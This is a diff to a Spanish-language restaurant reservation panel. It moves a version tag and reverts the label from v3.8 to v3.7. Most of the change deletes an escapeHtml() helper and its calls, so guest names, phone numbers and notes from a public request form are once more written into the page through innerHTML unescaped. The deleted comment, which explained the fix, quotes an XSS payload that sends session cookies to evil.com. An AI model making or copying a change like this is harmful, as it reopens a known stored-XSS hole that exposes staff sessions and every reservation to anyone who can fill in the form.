@@ -64,14 +64,6 @@ header{
 }
 .brand span{color:var(--text-dim); font-weight:400; font-size:13px; margin-left:8px;}
 
-/* ===== VERSION TAG (siempre visible, arriba a la derecha) ===== */
-.version-tag{
-  position:fixed; top:6px; right:8px; font-size:10px; color:var(--text-dim);
-  font-family:'JetBrains Mono',monospace; z-index:500; pointer-events:none;
-  opacity:.75; background:var(--panel-alt); border:1px solid var(--border-soft);
-  border-radius:6px; padding:2px 7px;
-}
-
 /* ===== ENCABEZADO FIJO CON LOGO (aparece en todas las pantallas) ===== */
 .logo-header{
   display:flex; flex-direction:column; align-items:center; justify-content:center;
@@ -543,6 +535,10 @@ main{flex:1; display:flex; overflow:hidden;}
   }
   .bottom-nav button.active{color:var(--gold-bright);}
   .bottom-nav .icon{font-size:17px;}
+.version-tag{
+  position:fixed; bottom:4px; right:8px; font-size:9px; color:var(--text-dim);
+  font-family:'JetBrains Mono',monospace; z-index:200; pointer-events:none; opacity:.6;
+}
 }
 </style>
 
@@ -660,7 +656,7 @@ main{flex:1; display:flex; overflow:hidden;}
     </div>
   </div>
 
-  <div class="version-tag">v3.8</div>
+  <div class="version-tag">v3.7</div>
 </div>
 
 <div class="overlay" id="overlay">
@@ -821,28 +817,6 @@ main{flex:1; display:flex; overflow:hidden;}
 </div>
 
 <script>
-/* ============ SEGURIDAD: ESCAPE DE HTML ============ */
-// Los campos "nombre", "obs" y "celular" pueden llegar de solicitud.html,
-// una página PÚBLICA sin autenticación. Cualquier persona puede escribir
-// ahí lo que quiera, incluyendo HTML/JavaScript malicioso. Como este panel
-// insertaba esos campos con innerHTML sin escapar, quedaba abierta una
-// vulnerabilidad de XSS almacenado: un texto como
-// <img src=x onerror="fetch('https://evil.com?c='+document.cookie)">
-// en el campo "Nombre" se ejecutaría en el navegador del restaurante en
-// cuanto abriera esta pantalla, con acceso completo a la sesión de
-// Firestore (leer/editar/borrar TODAS las reservas). escapeHtml() convierte
-// los caracteres especiales de HTML en entidades seguras antes de
-// insertarlos en el DOM.
-function escapeHtml(str){
-  if(str === undefined || str === null) return '';
-  return String(str)
-    .replace(/&/g, '&amp;')
-    .replace(/</g, '&lt;')
-    .replace(/>/g, '&gt;')
-    .replace(/"/g, '&quot;')
-    .replace(/'/g, '&#039;');
-}
-
 /* ============ DATA MODEL ============ */
 
 const SALONES_SEED = [
@@ -1146,18 +1120,7 @@ function renderLista(){
   const rs = reservasDelTurno().sort((a,b)=>a.hora.localeCompare(b.hora));
   const el = document.getElementById('panelLista');
   if(rs.length===0){
-    // Aviso más útil: si este día SÍ tiene reservas pero en otro turno,
-    // lo decimos explícitamente para no confundir con "no hay nada este día".
-    const iso = fechaISO(fechaActual);
-    const otrosTurnos = ['desayuno','almuerzo','cena']
-      .filter(t => t !== turnoActivo)
-      .filter(t => reservas.some(r => r.fecha===iso && r.turno===t && r.estado!=='cancelada' && r.estado!=='solicitud' && r.estado!=='pendiente_aprobacion'));
-    if(otrosTurnos.length){
-      const nombresTurnos = otrosTurnos.map(t => t.charAt(0).toUpperCase()+t.slice(1)).join(' y ');
-      el.innerHTML = `<div class="empty-state">No hay reservas en ${turnoActivo} para este día.<br>Este día sí tiene reservas en <b>${nombresTurnos}</b> — toca ese turno arriba para verlas.</div>`;
-    } else {
-      el.innerHTML = `<div class="empty-state">No hay reservas para este turno todavía.<br>Toca "+ Nueva reserva" para crear una.</div>`;
-    }
+    el.innerHTML = `<div class="empty-state">No hay reservas para este turno todavía.<br>Toca "+ Nueva reserva" para crear una.</div>`;
     return;
   }
   const cardsHtml = rs.map(r=>{
@@ -1166,8 +1129,8 @@ function renderLista(){
     return `<div class="res-card ${r.estado==='cancelada'?'cancelada-card':''} ${r.estado==='solicitud'?'solicitud-card':''}" onclick='abrirModal(${JSON.stringify(r.id)})'>
       <div class="res-top">
         <div>
-          <div class="res-hora">${escapeHtml(r.hora)}</div>
-          <div class="res-nombre">${escapeHtml(r.nombre)}</div>
+          <div class="res-hora">${r.hora}</div>
+          <div class="res-nombre">${r.nombre}</div>
         </div>
         <div class="res-top-right">
           <span class="badge ${r.estado}">${estadoLabel(r.estado)}</span>
@@ -1182,7 +1145,7 @@ function renderLista(){
         ${r.abono>0?`<span>Abono $${Number(r.abono).toLocaleString('es-CO')}</span>`:''}
         ${r.aprobadaPorCliente?`<span class="aprobada-tag">✓ Aprobada por cliente</span>`:''}
       </div>
-      ${r.estado==='solicitud'?`<div class="solicitud-hint">⚠ Sin mesa asignada — revisar y gestionar${r.obs?': '+escapeHtml(r.obs):''}</div>`:''}
+      ${r.estado==='solicitud'?`<div class="solicitud-hint">⚠ Sin mesa asignada — revisar y gestionar${r.obs?': '+r.obs:''}</div>`:''}
       ${r.estado==='pendiente_aprobacion'?`<div class="aprobacion-hint">📤 Enviada al cliente, esperando que la apruebe</div>`:''}
     </div>`;
   }).join('');
@@ -1212,7 +1175,7 @@ function renderResumenTurnoHTML(rsTodas){
   const vipSalonesHtml = vipPorSalon.map(({salon, reservas, pax}) => {
     const filas = reservas.length
       ? reservas.map(r => `<div class="resumen-fila">
-          <span class="resumen-fila-label">${escapeHtml(mesaLabel(r.mesa))} <span class="resumen-fila-nombre">· ${escapeHtml(r.nombre)}</span></span>
+          <span class="resumen-fila-label">${mesaLabel(r.mesa)} <span class="resumen-fila-nombre">· ${r.nombre}</span></span>
           <span class="resumen-fila-val">${r.pax} pax</span>
         </div>`).join('')
       : `<div class="resumen-fila resumen-vacio"><span>Sin reservas</span></div>`;
@@ -1288,10 +1251,10 @@ function renderPlano(){
       if(r) cls = r.estado==='pendiente' ? 'pendiente' : 'ocupada';
       const vipCls = s.vip ? 'vip' : '';
       const guestName = r ? (r.nombre.split(' ')[0]) : '';
-      return `<div class="mesa ${cls} ${vipCls}" onclick='${r?`abrirModal(${JSON.stringify(r.id)})`:`abrirModal(null,${JSON.stringify(m.id)})`}' title="${escapeHtml(m.id)} · cap ${m.cap}">
-        <div class="num">${escapeHtml(m.id)}</div>
+      return `<div class="mesa ${cls} ${vipCls}" onclick='${r?`abrirModal(${JSON.stringify(r.id)})`:`abrirModal(null,${JSON.stringify(m.id)})`}' title="${m.id} · cap ${m.cap}">
+        <div class="num">${m.id}</div>
         <div class="cap">${m.cap}p</div>
-        ${guestName?`<div class="guest">${escapeHtml(guestName)}</div>`:''}
+        ${guestName?`<div class="guest">${guestName}</div>`:''}
       </div>`;
     }).join('');
     const ocupadas = s.mesas.filter(m=>porMesa[m.id]).length;
@@ -1573,20 +1536,20 @@ function renderSolicitudesScreen(){
     <div class="solicitud-card-global ${claseColor}" onclick='abrirModal(${JSON.stringify(r.id)})'>
       <div class="sc-top">
         <div>
-          <div class="sc-fecha">${escapeHtml(r.turno)}</div>
-          <div class="sc-hora">${escapeHtml(r.hora)}</div>
-          <div class="sc-nombre">${escapeHtml(r.nombre)}</div>
+          <div class="sc-fecha">${r.turno}</div>
+          <div class="sc-hora">${r.hora}</div>
+          <div class="sc-nombre">${r.nombre}</div>
         </div>
         <span class="badge ${r.estado}">${estadoLabel(r.estado)}</span>
       </div>
       <div class="sc-meta">
         <span>${r.pax} pax</span>
         ${Number(r.pax)>=30?`<span class="especial-tag">⭐ Especial</span>`:''}
-        ${r.celular?`<span>${escapeHtml(r.celular)}</span>`:''}
-        ${r.mesa?`<span>Mesa ${escapeHtml(mesaLabel(r.mesa))}</span>`:''}
+        ${r.celular?`<span>${r.celular}</span>`:''}
+        ${r.mesa?`<span>Mesa ${mesaLabel(r.mesa)}</span>`:''}
         ${r.vipSolicitada?`<span class="vip-tag">Quiere VIP</span>`:''}
       </div>
-      ${r.obs?`<div class="sc-obs">${escapeHtml(r.obs)}</div>`:''}
+      ${r.obs?`<div class="sc-obs">${r.obs}</div>`:''}
       ${hint}
     </div>`;
   }).join('');
